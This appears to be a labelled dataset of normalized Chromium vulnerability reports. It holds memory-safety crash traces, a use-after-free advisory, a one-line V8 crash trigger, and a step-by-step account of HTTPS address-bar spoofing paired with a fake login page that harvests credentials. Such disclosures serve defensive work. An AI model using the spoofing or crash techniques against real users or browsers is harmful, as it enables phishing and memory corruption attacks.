zn11messageloop21deferorrunpendingtaskerkns_11pendingtaske sysinfo.cc:0 6 in zn11messageloop6doworkev sysinfo.cc:0 7 in zn4base18messagepumpdefault3runepns_11messagepump8delegatee sysinfo.cc:0 8 in zn11messageloop11runinternalev sysinfo.cc:0 9 in zn11messageloop3runev sysinfo.cc:0 10 in zn4base6thread10threadmainev sysinfo.cc:0 11 in zn4base12_global__n_110threadfuncepv base/threading/platform_thread_posix.cc:0 12 in zn10asanthread11threadstartev usr/local/google/asan/address-sanitizer/asan/asan_thread.cc:102 13 in start_thread home/aurel32/eglibc/eglibc-2.11.2/nptl/pthread_create.c:300 14 in home/aurel32/eglibc/eglibc-2.11.2/misc sysdeps/unix/sysv/linux/x86_64/clone.s:114 26270:26440:29543271666 error platform_thread_posix.cc 253 not implemented reached in static void base platformthread setthreadpriority platformthreadhandle base threadpriority is located 384 bytes to the right of 4096-byte region allocated by thread t92 here 0 in posix_memalign asan_rtl 1 in av_malloc 0 2 in vorbis_decode_init third_party/ffmpeg/patched-ffmpeg/libavcodec/vorbisdec.c:0 3 in avcodec_open2 0 4 in zn5media18ffmpegaudiodecoder12doinitializeerk13scoped_refptrins_13demuxerstreameerkn4base8callbackifvveeerkns7_ifvrkns_18pipelinestatisticseeee sysinfo.cc:0 5 in zn4base8internal8invoker4ilb0ens0_15invokerstorage4imn5media18ffmpegaudiodecoderefvrk13scoped_refptrins3_13demuxerstreameerkns_8callbackifvveeerknsa_ifvrkns3_18pipelinestatisticseeeeeps4_s7_sc_sj_eesn_e8doinvokeepns0_18invokerstoragebasee sysinfo.cc:0 6 in zn11messageloop7runtaskerkns_11pendingtaske sysinfo.cc:0 7 in zn11messageloop21deferorrunpendingtaskerkns_11pendingtaske sysinfo.cc:0 8 in zn11messageloop6doworkev sysinfo.cc:0 9 in zn4base18messagepumpdefault3runepns_11messagepump8delegatee sysinfo.cc:0 10 in zn11messageloop11runinternalev sysinfo.cc:0 11 in zn11messageloop3runev sysinfo.cc:0 12 in zn4base6thread10threadmainev sysinfo.cc:0 13 in zn4base12_global__n_110threadfuncepv base/threading/platform_thread_posix.cc:0 14 in zn10asanthread11threadstartev usr/local/google/asan/address-sanitizer/asan/asan_thread.cc:102 thread t92 created by t0 here 0 in pthread_create asan_rtl 1 in zn4base12_global__n_112createthreadembpns_14platformthread8delegateepm base/threading/platform_thread_posix.cc:0 2 in zn4base14platformthread6createempns0_8delegateepm sysinfo.cc:0 3 in zn4base6thread16startwithoptionserkns0_7optionse sysinfo.cc:0 4 in zn4base6thread5startev sysinfo.cc:0 5 in zn5media22messageloopfactoryimpl14getmessagelooperkss sysinfo.cc:0 6 in zn11webkit_glue18webmediaplayerimpl10initializeepn6webkit8webframeeb13scoped_refptrins_16webvideorendereree sysinfo.cc:0 7 in zn14renderviewimpl17createmediaplayerepn6webkit8webframeepns0_20webmediaplayercliente sysinfo.cc:0 8 in zn6webkit24webmediaplayerclientimpl12loadinternalev sysinfo.cc:0 9 in zn7webcore11mediaplayer23loadwithnextmediaengineepns_18mediaplayerfactorye sysinfo.cc:0 10 in zn7webcore11mediaplayer4loaderkn3wtf6stringerkns_11contenttypee sysinfo.cc:0 11 in zn7webcore16htmlmediaelement12loadresourceerkns_4kurlerns_11contenttypee sysinfo.cc:0 12 in zn7webcore16htmlmediaelement19selectmediaresourceev sysinfo.cc:0 13 in zn7webcore16htmlmediaelement12loadinternalev sysinfo.cc:0 14 in zn7webcore12threadtimers24sharedtimerfiredinternalev sysinfo.cc:0 15 in zn4base6subtle18taskclosureadapter3runev sysinfo.cc:0 16 in zn11messageloop7runtaskerkns_11pendingtaske sysinfo.cc:0 17 in zn11messageloop21deferorrunpendingtaskerkns_11pendingtaske sysinfo.cc:0 18 in zn11messageloop6doworkev sysinfo.cc:0 19 in zn4base18messagepumpdefault3runepns_11messagepump8delegatee sysinfo.cc:0 20 in zn11messageloop11runinternalev sysinfo.cc:0 21 in zn11messageloop3runev sysinfo.cc:0 22 in z12renderermainrk18mainfunctionparams sysinfo.cc:0 23 in zn12_global__n_123runnamedprocesstypemainerkssrk18mainfunctionparamspn7content19contentmaindelegatee content/app/content_main.cc:0 24 in zn7content11contentmaineippkcpns_19contentmaindelegatee sysinfo.cc:0 25 in chromemain 0 26 in main sysinfo.cc:0 27 in libc_start_main home/aurel32/eglibc/eglibc-2.11.2/csu/libc-start.c:260 26270 aborting shadow byte and word fa fa fa fa fa fa fa fa fa more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa	11
security buffer overrun leading to heap corruption in angle shader translator vulnerability details loading certain shaders via webgl causes buffer overruns in the angle shader translator which corrupt the heap in the gpu process version chrome version 15 and 16 affected on all operating systems reproduction case test case is attached it should be copied into the subdirectory sdk/tests/conformance/glsl/misc of a checkout of the webgl conformance tests see the loading of goodvertexshader is what provokes the memory corruption chrome relies on the angle shader validator to provide type information about the active uniform variables and vertex attributes the location of the vec4 buried in the uniform variable identifier128characterslong exceeds the length expectations of the code which preserves this information fundamentally the problem was that strcpy was being used instead of strncpy for crashes please include the following additional information type of crash gpu process crash state stack trace attached	11
zdi-can-1416 webkit contenteditable swapinnode use-after-free remote code execution vulnerability zdi-can-1416 webkit contenteditable swapinnode use-after-free remote code execution vulnerability cvss 4.6 av l/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products apple webkit google chrome apple safari vulnerability details this vulnerability resides within the webkit library and occurs due to the implementation not accomodating for mutations that can occur during a modification to the dom tree in the code that follows the application snags the reference to the target node and then inserts an element before it webcore/editing/replacenodewithspancommand.cpp:51 static void swapinnodepreservingattributesandchildren htmlelement newnode htmlelement nodetoreplace assert nodetoreplace indocument exceptioncode ec 0 containernode parentnode nodetoreplace parentnode xxx parentnode insertbefore newnode nodetoreplace ec assert ec refptr node nextchild for node child nodetoreplace firstchild child child nextchild.get nextchild child nextsibling newnode appendchild child ec assert ec newnode attributes setattributes nodetoreplace attributes parentnode removechild nodetoreplace ec assert ec due to the unguarded pointer being copied an aggressor can manipulate the dom tree when the insertbefore method is called the next time this element is used the type switch will have already occurred which should should then allow for one to execute arbitrary code credit this vulnerability was discovered by pa_kt twitter.com/pa_kt fixed in we will merge to first m15 stable patch	11
failure to infobar jre7 if the user has jre7 installed current version jre7u1 java applets run without user confirmation this is a significant drive-by download risk even with a fully patched jre whilst this is being fixed might as well update the metadata for the jre6 release stream the cause was an upper bound of 7 on the version check whereas there should not have been an upper bound	2
langfuzz crash at v8 internal writequotejsonstring with invalid write vulnerability details the javascript code below crashes chromium 17.0.928.0 and d8 shell at function v8 internal writequotejsonstring with an invalid write version chrome version 17.0.928.0 dev operating system ubuntu 11.04 tested on 64 bit reproduction case var a a 1999 e json.stringify a.join u0094 for crashes please include the following additional information type of crash tab crash state gdb trace no symbols for some reason it s chrome from google directly program received signal sigsegv segmentation fault in gdb bt 0 in 1 in 2 in gdb x 4i pc movzbl rdx rdi,1 edi lea r10 rsi,1 rsi movzbl rsi r8d cmp edi gdb info register rdx rdi edi rdx 140737345602560 rdi 4294967188 edi 108 valgrind on d8 23278 invalid write of size 1 23278 at zn2v88internall20writequotejsonstringicceept_pns0_7isolatees3_ns0_6vectorikt0_ee.clone.199 in scratch/holler/langfuzz/v8-3.6/d8 23278 address is not stack d malloc d or recently free d 23278 23278 23278 process terminating with default action of signal 11 sigsegv 23278 bad permissions for mapped region at address 23278 at zn2v88internall20writequotejsonstringicceept_pns0_7isolatees3_ns0_6vectorikt0_ee.clone.199 in scratch/holler/langfuzz/v8-3.6/d8	11
valgrind reports issues in icu_46 regexmatcher what steps will reproduce the problem 1 run valgrind bot 2 notice issue in icu_46 regexmatcher what is the expected output no issues what do you see instead 17:04:02 memcheck_analyze.py error fail there were 3 errors 17:04:07 memcheck_analyze.py error command src/xcodebuild/release/unit_tests gtest_filter=-p2ptransportimpltest.fails_senddatatcp syncbackendhosttest.flaky_initshutdown webdroptargettest.fails_url nsmenuitemadditionstest.testmondifferentlayouts syncbackendhosttest.initshutdown prefscontrollertest.showandclose p2ptransportimpltest.create prefscontrollertest.flaky_showandclose p2ptransportimpltest.flaky_senddataudp visitedlinkrelaytest.basics connectiontestertest.flaky_runalltests webdroptargettest.flaky_data prefscontrollertest.fails_switchtopage signedsettingstest.flaky_storepolicynopolicydata connectiontestertest.fails_runalltests predictortest.fails_massiveconcurrentlookuptest p2ptransportimpltest.fails_connecttcp renderviewtest.imecomposition firefoximportertest.flaky_firefox3nss3decryptor firefoximportertest.fails_firefox3nss3decryptor prefscontrollertest.fails_getprefsviewforpage processinfosnapshotmactest.effectivevsrealuseridtest visitedlinkeventstest.flaky_coalescense p2ptransportimpltest.flaky_senddatatcp p2ptransportimpltest.fails_connectudp p2ptransportimpltest.fails_create p2ptransportimpltest.connectudp syncbackendhosttest.fails_initshutdown renderviewtest.flaky_imecomposition p2ptransportimpltest.flaky_connectudp renderviewtest.fails_imecomposition p2ptransportimpltest.connecttcp signedsettingstest.storepolicynopolicydata prefscontrollertest.switchtopage processinfosnapshotmactest.flaky_effectivevsrealuseridtest visitedlinkrelaytest.fails_basics predictortest.flaky_massiveconcurrentlookuptest webdroptargettest.flaky_url visitedlinkeventstest.fails_coalescense bookmarkbarcontrollertest.deletefromoffthesidewhileitisopen visitedlinkeventstest.coalescense bookmarkbarcontrollertest.flaky_deletefromoffthesidewhileitisopen prefscontrollertest.flaky_getprefsviewforpage prefscontrollertest.gettoolbaritemforpage processinfosnapshotmactest.fails_effectivevsrealuseridtest p2ptransportimpltest.flaky_connecttcp prefscontrollertest.flaky_gettoolbaritemforpage p2ptransportimpltest.senddatatcp p2ptransportimpltest.flaky_create inputmethodutiltest p2ptransportimpltest.fails_senddataudp prefscontrollertest.getprefsviewforpage webdroptargettest.data bookmarkbarcontrollertest.fails_deletefromoffthesidewhileitisopen predictortest.massiveconcurrentlookuptest firefoximportertest.firefox3nss3decryptor nsmenuitemadditionstest.flaky_testmondifferentlayouts prefscontrollertest.flaky_switchtopage webdroptargettest.fails_data visitedlinkrelaytest.flaky_basics prefscontrollertest.fails_showandclose connectiontestertest.runalltests ipcsyncchanneltest p2ptransportimpltest.senddataudp webdroptargettest.url nsmenuitemadditionstest.fails_testmondifferentlayouts signedsettingstest.fails_storepolicynopolicydata prefscontrollertest.fails_gettoolbaritemforpage gtest_print_time uninitvalue use of uninitialised value of size 4 ucase_tofullfolding_46 icu_46 regexmatcher matchchunkat int signed char uerrorcode icu_46 regexmatcher matches long long uerrorcode icuregularexpression match char const bool std basic_string char std char_traits char std allocator char const i18n phonenumbers phonenumberutil isviablephonenumber std basic_string char std char_traits char std allocator char const i18n phonenumbers phonenumberutil parsehelper std basic_string char std char_traits char std allocator char const std basic_string char std char_traits char std allocator char const bool bool i18n phonenumbers phonenumber const i18n phonenumbers phonenumberutil parse std basic_string char std char_traits char std allocator char const std basic_string char std char_traits char std allocator char const i18n phonenumbers phonenumber const autofill_i18n phonenumbersmatch std basic_string unsigned short base string16_char_traits std allocator unsigned short const std basic_string unsigned short base string16_char_traits std allocator unsigned short const std basic_string char std char_traits char std allocator char const phonenumberi18ntest_phonenumbersmatch_test testbody void testing internal handlesehexceptionsinmethodifsupported testing test void testing test void testing test char const void testing internal handleexceptionsinmethodifsupported testing test void testing test void testing test char const testing test run suppression error hash fffffffff539cc33 insert_a_suppression_name_here memcheck value4 fun ucase_tofullfolding_46 fun zn6icu_4612regexmatcher12matchchunkateiar10uerrorcode fun zn6icu_4612regexmatcher7matchesexr10uerrorcode fun znk20icuregularexpression5matchepkcbpss fun zn4i18n12phonenumbers15phonenumberutil19isviablephonenumbererkss fun znk4i18n12phonenumbers15phonenumberutil11parsehelpererksss3_bbpns0_11phonenumbere fun znk4i18n12phonenumbers15phonenumberutil5parseerksss3_pns0_11phonenumbere fun zn13autofill_i18n17phonenumbersmatcherksbitn4base20string16_char_traitsesaitees5_rkss fun zn42phonenumberi18ntest_phonenumbersmatch_test8testbodyev fun zn7testing8internal38handlesehexceptionsinmethodifsupportedins_4testeveet0_pt_ms4_fs3_vepkc fun zn7testing8internal35handleexceptionsinmethodifsupportedins_4testeveet0_pt_ms4_fs3_vepkc 17:04:07 memcheck_analyze.py error command src/xcodebuild/release/unit_tests gtest_filter=-p2ptransportimpltest.fails_senddatatcp syncbackendhosttest.flaky_initshutdown webdroptargettest.fails_url nsmenuitemadditionstest.testmondifferentlayouts syncbackendhosttest.initshutdown prefscontrollertest.showandclose p2ptransportimpltest.create prefscontrollertest.flaky_showandclose p2ptransportimpltest.flaky_senddataudp visitedlinkrelaytest.basics connectiontestertest.flaky_runalltests webdroptargettest.flaky_data prefscontrollertest.fails_switchtopage signedsettingstest.flaky_storepolicynopolicydata connectiontestertest.fails_runalltests predictortest.fails_massiveconcurrentlookuptest p2ptransportimpltest.fails_connecttcp renderviewtest.imecomposition firefoximportertest.flaky_firefox3nss3decryptor firefoximportertest.fails_firefox3nss3decryptor prefscontrollertest.fails_getprefsviewforpage processinfosnapshotmactest.effectivevsrealuseridtest visitedlinkeventstest.flaky_coalescense p2ptransportimpltest.flaky_senddatatcp p2ptransportimpltest.fails_connectudp p2ptransportimpltest.fails_create p2ptransportimpltest.connectudp syncbackendhosttest.fails_initshutdown renderviewtest.flaky_imecomposition p2ptransportimpltest.flaky_connectudp renderviewtest.fails_imecomposition p2ptransportimpltest.connecttcp signedsettingstest.storepolicynopolicydata prefscontrollertest.switchtopage processinfosnapshotmactest.flaky_effectivevsrealuseridtest visitedlinkrelaytest.fails_basics predictortest.flaky_massiveconcurrentlookuptest webdroptargettest.flaky_url visitedlinkeventstest.fails_coalescense bookmarkbarcontrollertest.deletefromoffthesidewhileitisopen visitedlinkeventstest.coalescense bookmarkbarcontrollertest.flaky_deletefromoffthesidewhileitisopen prefscontrollertest.flaky_getprefsviewforpage prefscontrollertest.gettoolbaritemforpage processinfosnapshotmactest.fails_effectivevsrealuseridtest p2ptransportimpltest.flaky_connecttcp prefscontrollertest.flaky_gettoolbaritemforpage p2ptransportimpltest.senddatatcp p2ptransportimpltest.flaky_create inputmethodutiltest p2ptransportimpltest.fails_senddataudp prefscontrollertest.getprefsviewforpage webdroptargettest.data bookmarkbarcontrollertest.fails_deletefromoffthesidewhileitisopen predictortest.massiveconcurrentlookuptest firefoximportertest.firefox3nss3decryptor nsmenuitemadditionstest.flaky_testmondifferentlayouts prefscontrollertest.flaky_switchtopage webdroptargettest.fails_data visitedlinkrelaytest.flaky_basics prefscontrollertest.fails_showandclose connectiontestertest.runalltests ipcsyncchanneltest p2ptransportimpltest.senddataudp webdroptargettest.url nsmenuitemadditionstest.fails_testmondifferentlayouts signedsettingstest.fails_storepolicynopolicydata prefscontrollertest.fails_gettoolbaritemforpage gtest_print_time uninitcondition conditional jump or move depends on uninitialised value s icu_46 regexmatcher matchchunkat int signed char uerrorcode icu_46 regexmatcher matches long long uerrorcode icuregularexpression match char const bool std basic_string char std char_traits char std allocator char const i18n phonenumbers phonenumberutil isviablephonenumber std basic_string char std char_traits char std allocator char const i18n phonenumbers phonenumberutil parsehelper std basic_string char std char_traits char std allocator char const std basic_string char std char_traits char std allocator char const bool bool i18n phonenumbers phonenumber const i18n phonenumbers phonenumberutil parse std basic_string char std char_traits char std allocator char const std basic_string char std char_traits char std allocator char const i18n phonenumbers phonenumber const autofill_i18n phonenumbersmatch std basic_string unsigned short base string16_char_traits std allocator unsigned short const std basic_string unsigned short base string16_char_traits std allocator unsigned short const std basic_string char std char_traits char std allocator char const phonenumberi18ntest_phonenumbersmatch_test testbody void testing internal handlesehexceptionsinmethodifsupported testing test void testing test void testing test char const void testing internal handleexceptionsinmethodifsupported testing test void testing test void testing test char const testing test run suppression error hash 00000000791a1bd9 insert_a_suppression_name_here memcheck cond fun zn6icu_4612regexmatcher12matchchunkateiar10uerrorcode fun zn6icu_4612regexmatcher7matchesexr10uerrorcode fun znk20icuregularexpression5matchepkcbpss fun zn4i18n12phonenumbers15phonenumberutil19isviablephonenumbererkss fun znk4i18n12phonenumbers15phonenumberutil11parsehelpererksss3_bbpns0_11phonenumbere fun znk4i18n12phonenumbers15phonenumberutil5parseerksss3_pns0_11phonenumbere fun zn13autofill_i18n17phonenumbersmatcherksbitn4base20string16_char_traitsesaitees5_rkss fun zn42phonenumberi18ntest_phonenumbersmatch_test8testbodyev fun zn7testing8internal38handlesehexceptionsinmethodifsupportedins_4testeveet0_pt_ms4_fs3_vepkc fun zn7testing8internal35handleexceptionsinmethodifsupportedins_4testeveet0_pt_ms4_fs3_vepkc 17:04:07 memcheck_analyze.py error command src/xcodebuild/release/unit_tests gtest_filter=-p2ptransportimpltest.fails_senddatatcp syncbackendhosttest.flaky_initshutdown webdroptargettest.fails_url nsmenuitemadditionstest.testmondifferentlayouts syncbackendhosttest.initshutdown prefscontrollertest.showandclose p2ptransportimpltest.create prefscontrollertest.flaky_showandclose p2ptransportimpltest.flaky_senddataudp visitedlinkrelaytest.basics connectiontestertest.flaky_runalltests webdroptargettest.flaky_data prefscontrollertest.fails_switchtopage signedsettingstest.flaky_storepolicynopolicydata connectiontestertest.fails_runalltests predictortest.fails_massiveconcurrentlookuptest p2ptransportimpltest.fails_connecttcp renderviewtest.imecomposition firefoximportertest.flaky_firefox3nss3decryptor firefoximportertest.fails_firefox3nss3decryptor prefscontrollertest.fails_getprefsviewforpage processinfosnapshotmactest.effectivevsrealuseridtest visitedlinkeventstest.flaky_coalescense p2ptransportimpltest.flaky_senddatatcp p2ptransportimpltest.fails_connectudp p2ptransportimpltest.fails_create p2ptransportimpltest.connectudp syncbackendhosttest.fails_initshutdown renderviewtest.flaky_imecomposition p2ptransportimpltest.flaky_connectudp renderviewtest.fails_imecomposition p2ptransportimpltest.connecttcp signedsettingstest.storepolicynopolicydata prefscontrollertest.switchtopage processinfosnapshotmactest.flaky_effectivevsrealuseridtest visitedlinkrelaytest.fails_basics predictortest.flaky_massiveconcurrentlookuptest webdroptargettest.flaky_url visitedlinkeventstest.fails_coalescense bookmarkbarcontrollertest.deletefromoffthesidewhileitisopen visitedlinkeventstest.coalescense bookmarkbarcontrollertest.flaky_deletefromoffthesidewhileitisopen prefscontrollertest.flaky_getprefsviewforpage prefscontrollertest.gettoolbaritemforpage processinfosnapshotmactest.fails_effectivevsrealuseridtest p2ptransportimpltest.flaky_connecttcp prefscontrollertest.flaky_gettoolbaritemforpage p2ptransportimpltest.senddatatcp p2ptransportimpltest.flaky_create inputmethodutiltest p2ptransportimpltest.fails_senddataudp prefscontrollertest.getprefsviewforpage webdroptargettest.data bookmarkbarcontrollertest.fails_deletefromoffthesidewhileitisopen predictortest.massiveconcurrentlookuptest firefoximportertest.firefox3nss3decryptor nsmenuitemadditionstest.flaky_testmondifferentlayouts prefscontrollertest.flaky_switchtopage webdroptargettest.fails_data visitedlinkrelaytest.flaky_basics prefscontrollertest.fails_showandclose connectiontestertest.runalltests ipcsyncchanneltest p2ptransportimpltest.senddataudp webdroptargettest.url nsmenuitemadditionstest.fails_testmondifferentlayouts signedsettingstest.fails_storepolicynopolicydata prefscontrollertest.fails_gettoolbaritemforpage gtest_print_time uninitcondition conditional jump or move depends on uninitialised value s ucase_tofullfolding_46 icu_46 regexmatcher matchchunkat int signed char uerrorcode icu_46 regexmatcher matches long long uerrorcode icuregularexpression match char const bool std basic_string char std char_traits char std allocator char const i18n phonenumbers phonenumberutil isviablephonenumber std basic_string char std char_traits char std allocator char const i18n phonenumbers phonenumberutil parsehelper std basic_string char std char_traits char std allocator char const std basic_string char std char_traits char std allocator char const bool bool i18n phonenumbers phonenumber const i18n phonenumbers phonenumberutil parse std basic_string char std char_traits char std allocator char const std basic_string char std char_traits char std allocator char const i18n phonenumbers phonenumber const autofill_i18n phonenumbersmatch std basic_string unsigned short base string16_char_traits std allocator unsigned short const std basic_string unsigned short base string16_char_traits std allocator unsigned short const std basic_string char std char_traits char std allocator char const phonenumberi18ntest_phonenumbersmatch_test testbody void testing internal handlesehexceptionsinmethodifsupported testing test void testing test void testing test char const void testing internal handleexceptionsinmethodifsupported testing test void testing test void testing test char const testing test run suppression error hash 000000006926059b insert_a_suppression_name_here memcheck cond fun ucase_tofullfolding_46 fun zn6icu_4612regexmatcher12matchchunkateiar10uerrorcode fun zn6icu_4612regexmatcher7matchesexr10uerrorcode fun znk20icuregularexpression5matchepkcbpss fun zn4i18n12phonenumbers15phonenumberutil19isviablephonenumbererkss fun znk4i18n12phonenumbers15phonenumberutil11parsehelpererksss3_bbpns0_11phonenumbere fun znk4i18n12phonenumbers15phonenumberutil5parseerksss3_pns0_11phonenumbere fun zn13autofill_i18n17phonenumbersmatcherksbitn4base20string16_char_traitsesaitees5_rkss fun zn42phonenumberi18ntest_phonenumbersmatch_test8testbodyev fun zn7testing8internal38handlesehexceptionsinmethodifsupportedins_4testeveet0_pt_ms4_fs3_vepkc fun zn7testing8internal35handleexceptionsinmethodifsupportedins_4testeveet0_pt_ms4_fs3_vepkc	11
4 oob reads in xmldocumentparser dowrite found in my fuzzing asan clusterfuzz bot cluster_fuzz_56 on platform linux chromium revision 99672 webkit revision 94518 testcase run from layouttests/fast/xsl xml version 1.0 xml-stylesheet type text/xsl href mozilla-tests.xsl mnt/scratch0/chrome/src/out/release/chrome allow-file-access-from-files disable-click-to-play disable-hang-monitor disable-metrics disable-popup-blocking disable-prompt-on-repost enable-desktop-notifications enable-experimental-extension-apis enable-extension-apps enable-extension-timeline-api enable-geolocation enable-indexed-database enable-nacl enable-native-web-workers enable-search-provider-api-v2 force-internal-pdf incognito js-flags expose-gc new-window no-default-browser-check no-first-run no-process-singleton-dialog no-sandbox single-process disable-gpu-plugin disable-gpu-rendering disable-accelerated-compositing disable-webgl disable-accelerated-2d-canvas user-data-dir=/mnt/scratch0/fuzztmp/t36 asan sigill hint if your stack trace looks short or garbled use asan_options=fast_unwind=0 17245 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 1 at thread t12 0 in xmlparsetryorfinish third_party/libxml/src/parser.c:0 1 in xmlparsechunk 2 in webcore xmldocumentparser dowrite wtf string const 3 in webcore xmldocumentparser append webcore segmentedstring const 4 in webcore decodeddatadocumentparser appendbytes webcore documentwriter char const unsigned long 5 in webcore documentloader commitdata char const unsigned long 6 in webkit frameloaderclientimpl committedload webcore documentloader char const int 7 in webcore documentloader commitload char const int 8 in webcore resourceloader didreceivedata char const int long long bool 9 in webcore mainresourceloader didreceivedata char const int long long bool 10 in webcore resourceloader didreceivedata webcore resourcehandle char const int int 11 in resourcedispatcher onreceiveddata ipc message const int base filedescriptor int int 12 in resourcedispatcher dispatchmessage ipc message const 13 in resourcedispatcher onmessagereceived ipc message const 14 in childthread onmessagereceived ipc message const 15 in ipc channelproxy context ondispatchmessage ipc message const 16 in base subtle taskclosureadapter run 17 in messageloop runtask messageloop pendingtask const 18 in messageloop deferorrunpendingtask messageloop pendingtask const 19 in messageloop dowork 20 in base messagepumpdefault run base messagepump delegate 21 in messageloop runinternal 22 in messageloop run 23 in base thread threadmain 24 in base anonymous namespace threadfunc void base/threading/platform_thread_posix.cc:0 25 in asanthread threadstart usr/local/google/asan/address-sanitizer/asan/asan_thread.cc:102 26 in start_thread build/buildd/eglibc-2.11.1/nptl/pthread_create.c:300 27 in build/buildd/eglibc-2.11.1/misc sysdeps/unix/sysv/linux/x86_64/clone.s:114 is located 0 bytes to the right of global variable str11 of size 1 17245 aborting shadow byte and word 1 fc fc fc fc 01 f9 f9 f9 more shadow bytes 00 00 00 00 00 01 f9 f9 fc fc fc fc 00 00 00 00 02 f9 f9 f9 fc fc fc fc 00 00 00 00 05 f9 f9 f9 fc fc fc fc 01 f9 f9 f9 fc fc fc fc 00 00 00 00 00 f9 f9 f9 fc fc fc fc 00 00 00 00 00 00 00 04 fc fc fc fc 00 00 00 00	7
security https address bar spoofing using view-source and redirection vulnerability details there is an inconsistency in the way google chrome renders some web page redirections in a way that allows an attacker to perform address bar spoofing resulting in an https url being displayed with the content from some other web site let s take for example a simple javascript redirection page located at that looks as follows script location script when observing the above sample in execution all parts of ui behave consistently meaning that as the address bar changes from url of the source page to the target url the page content changes accordingly and promptly at once however by altering the script like this location view-source one can see the address bar starts changing before the source page content gets replaced by a new canvas so for a split second the address bar displays while the dom is still from the given example is composed of 2 tricks 1 apparently the view-source prefix causes the asynchronous behavior between address bar and the dom 2 the redir.php is a http 302 redirection script used to cause a redirect from view-source to thus removing the view-source prefix from the url the goal is to spoof the address bar to a legitimate domain as will be shown later also after redirection the browser no longer tries to display the source code but renders the html of all demos available from address below employ the above 2 tricks with replaced by a gmail login page address however to stop the redirection at the exact moment when the inconsistency between the address bar and the page contents is being exhibited a further trick is used in abs1.php is used as target of the redir.php script to block the redirection for about 30 seconds after that an error page is displayed as chrome decides that it can not establish an ssl/tls connection with the server on port 80 at the same time as the redirection view source om:80 is triggered a form with a text field is displayed simulating a fake login page if text is entered and the submit button is pressed the data gets sent to tests have shown that instead of an unresponsive server script can be used or an invalid target url such as view-source in abs2.php we avoid the suspicious 80 port by using any open redirect present on as the desired spoof url the demo is analogous to the previous except that an additional redirect is used after the script and the is replaced by a download-throttling page that delays the loading for an arbitrary amount of time this time the url that the redirection gets stuck on is in abs3.php we manage to spoof the exact url string of the gmail login page to do that a modal dialog is used to stop the redirection instead of the wrong port trick as in or the download-throttling slow.php mentioned above a precondition however is that the victim has come to from the spoofed-to-be host in our case or another host in its 2nd level domain either via search results or a redirection script before address bar spoofing redirection begins and a modal dialog can stop it step 1 in step 2 a similar redirection is launched as in the previous demo but with the following differences a blocked pinned modal dialog is used to stop the redirection at the right moment like in the previous demo a fake login form is displayed but any requests resulting from its submit button being pressed are queued for the life time of the modal dialog therefore a self destruction javascript is in place inside the modal dialog that triggers after the submit button has been pressed thus releasing the said queue and allowing the credentials to be sent to attacker s server a more convincing url is used as target of the redir.php script avoiding the 80 port trick and the slow.php trick from previous demos all three demos are available here as on-the-fly links for further clarification of each individual demo open their individual pages in chrome and follow the on-screen step by step instructions demo 1 demo 2 demo 3 of course in a real world attack the described demos would be presented to the victim as click me urls enveloped as redirect urls from www.google.com without further interaction needed in summary we found ways to get chrome to display an https url from one host while displaying the content from another host note that the icon left to the url is a grey planet as is typical for http addresses and not a green lock as is typical for valid https addresses however while many users may notice the https and consider it as a guarantee of trust they are less likely to notice the absence of a lock especially since the visual identification of https urls is different in different web browsers in addition while users could notice a crossed over lock icon shown on https web sites that seem suspect a grey planet icon does not indicate any danger version chrome version v14.0.835.187+stable,16.0.891.0+dev-m operating system windows xp version 5.1.2600 service pack 3 build 2600 windows 7 professional sp1	9
oob read in svg at webcore parsearcflag vulnerability details asan reports an oob heap read when the attached svg file is loaded the error comes when reading data past the end of a string while parsing a path i do n't have asan builds for stable and beta yet so not sure if this affects them no obvious security impact but this might also affect beta/stable and the controllable string and possibly somewhat controllable data after it leave some room to play so filing as a potential security bug version chrome version 16.0.911.0 developer build 105764 operating system linux debian 6.0.3 x86_64 reproduction case chrome oobr.svg for crashes please include the following additional information type of crash tab crash state program received signal sigill illegal instruction in webcore parsearcflag ptr=unhandled dwarf expression opcode at third_party/webkit/source/webcore/svg/svgparserutilities.cpp:161 161 const uchar flagchar ptr gdb list 156 157 only used to parse largearcflag and sweepflag which must be a 0 or 1 158 and might not have any whitespace/comma after it 159 bool parsearcflag const uchar ptr const uchar end bool flag 160 161 const uchar flagchar ptr 162 if flagchar 0 163 flag false 164 else if flagchar 1 165 flag true gdb bt 5 0 in webcore parsearcflag ptr=unhandled dwarf expression opcode at third_party/webkit/source/webcore/svg/svgparserutilities.cpp:161 1 in webcore svgpathstringsource parsearctosegment this=dwarf-2 expression error dw_op_reg operations must be used either alone or in conjuction with dw_op_piece or dw_op_bit_piece at third_party/webkit/source/webcore/svg/svgpathstringsource.cpp:231 2 in webcore svgpathparser parsearctosegment this optimized out at third_party/webkit/source/webcore/svg/svgpathparser.cpp:246 3 in webcore svgpathparser parsepathdatafromsource this optimized out pathparsingmode=unhandled dwarf expression opcode at third_party/webkit/source/webcore/svg/svgpathparser.cpp:359 4 in webcore svgpathparserfactory buildsvgpathbytestreamfromstring this optimized out d optimized out result=unhandled dwarf expression opcode at third_party/webkit/source/webcore/svg/svgpathparserfactory.cpp:238 more stack frames follow 25351 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 2 at thread t0 is located 0 bytes to the right of 106-byte region	11
security css/cssparser.cpp memory corruption bug vulnerability details date 16 oct 2011 version the lastest chrome version in cvs target chromium filename css/cssparser.cpp bug type unbound memory access process layer the renderer process function cssparser addproperty int propid passrefptr cssvalue value bool important description void cssparser addproperty int propid passrefptr cssvalue value bool important ownptr cssproperty prop new cssproperty propid value important m_currentshorthand m_implicitshorthand if m_numparsedproperties m_maxparsedproperties m_maxparsedproperties 32 1 if m_maxparsedproperties uint_max sizeof cssproperty 2 return m_parsedproperties static_cast cssproperty fastrealloc m_parsedproperties m_maxparsedproperties sizeof cssproperty m_parsedproperties m_numparsedproperties prop.leakptr 3 2 the code prevents from overflowing but as you can see 1 m_maxparsedproperties can be added if m_numparsedproperties is bigger or same so if we call a lot addproperty it will be checked by 2 but once it ll bypass 2 as m_maxparsedproperties will be overflowed then we can manipulate unbound memory area at 3 problem even though i could't make any crash yet with some reasons i do n't have my computer to test this bug yet i ca n't install chromium in my school s desktop however i believe this is a memory corruption bug but i have to say it s hard to trigger this bug since we need to hit the routine for almost 32 it would take a lot of time and system resources i do n't think this bug is useful in the real world but still can be named as a security bug version chrome version x.x.x.x stable beta or dev operating system please 